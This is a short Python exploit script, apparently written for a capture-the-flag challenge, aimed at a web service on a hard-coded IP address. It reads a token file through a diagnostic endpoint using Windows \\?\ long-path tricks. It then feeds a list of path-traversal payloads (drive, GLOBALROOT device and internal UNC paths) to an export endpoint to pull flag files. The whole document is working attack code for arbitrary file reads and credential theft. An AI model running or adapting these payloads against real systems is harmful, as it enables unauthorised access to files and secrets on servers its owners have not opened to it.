import requests

BASE_URL = "http://1.95.51.2:8080"

def get_token():
    try:
        r = requests.get(f"{BASE_URL}/api/diag/read", params={"path": r"\\?\C:\token\access_key.txt"}, timeout=5)
        if r.status_code == 200 and r.json().get("success"):
            return r.json().get("token")
    except:
        pass
    return None

def check(path):
    t = get_token()
    if not t: return
    url = f"{BASE_URL}/api/export/read"
    try:
        r = requests.get(url, params={"path": path, "token": t}, timeout=5)
        print(f"Path: {path} -> {r.status_code} {r.text[:100]}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    payloads = [
        r"\\?\D:",
        r"\\?\D:\*",
        r"\\?\backup\flag.txt",
        r"\\?\Backup\flag.txt",
        r"\\?\GLOBALROOT\Device\HarddiskVolume2\flag.txt", # Guess C volume
        r"\\?\GLOBALROOT\Device\Mup\172.20.0.10\backup\flag.txt" # Verify block again
    ]
    for p in payloads:
        check(p)
